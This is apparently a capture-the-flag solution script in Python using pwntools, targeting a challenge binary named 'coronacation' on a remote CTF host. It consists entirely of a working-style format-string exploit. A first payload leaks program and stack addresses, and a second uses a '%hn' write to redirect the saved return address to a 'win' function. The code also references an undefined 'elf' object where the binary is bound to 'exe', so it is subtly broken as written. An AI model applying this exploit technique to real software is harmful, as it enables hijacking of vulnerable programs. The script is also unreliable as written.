#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF('./coronacation')

host = args.HOST or 'ctf.umbccd.io'
port = int(args.PORT or 4300)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
pie break *0x1426
pie break *0x135D
continue
'''.format(**locals())

io = start()
io.recvuntil("freaking out.\n")

payload = (
    b"1 "
    b"%9$p_%45$p_%14$p"
)
io.sendline(payload)

data = io.recvuntil("healthcare plan.\n")
res = re.findall(b" (0x[0-9a-f]+)_(0x[0-9a-f]+)_(0x[0-9a-f]+)\n", data)

elf_leak = int(res[0][0], 16)
elf.address = elf_leak - 0x14d5
win = elf.address + 0x1165

stack_leak = int(res[0][1], 16)
stack_leak2 = int(res[0][2], 16)
stack = stack_leak - 0x206eb

ret_stack = stack_leak2 - 88

log.info("ELF leak: 0x%x", elf_leak)
log.info("ELF: 0x%x", elf.address)
log.info("WIN: 0x%x", win)
log.info("Stack leak: 0x%x", stack_leak)
log.info("Stack: 0x%x", stack)
log.info("Ret on stack: 0x%x", ret_stack)

num = (win & 0xffff) - 0xe + 13
fmt = ("%" + str(num) + "x").ljust(8, "B")

payload = (
    bytes(fmt, "utf-8") +
    b"%8$hn" + b"C" * 3 +
    p64(ret_stack)
)
io.sendline(payload)
io.interactive()
